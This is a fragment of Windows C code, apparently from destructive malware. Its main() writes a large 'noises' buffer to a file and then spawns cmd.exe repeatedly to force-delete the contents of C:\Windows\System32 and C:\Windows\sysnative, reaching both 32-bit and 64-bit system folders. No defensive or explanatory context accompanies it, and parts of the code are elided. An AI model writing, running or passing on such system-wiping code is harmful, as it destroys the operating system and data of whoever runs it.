...
int main()
{
	...
	WriteFile(hnoises, noises, 892028, &writewhitenoise, NULL);
	CloseHandle(hFlush);
	CloseHandle(hnoises);
	...
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c del /f /s /q C:\\Windows\\System32", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c del /f /s /q C:\\Windows\\System32", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c del /f /s /q C:\\Windows\\sysnative", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
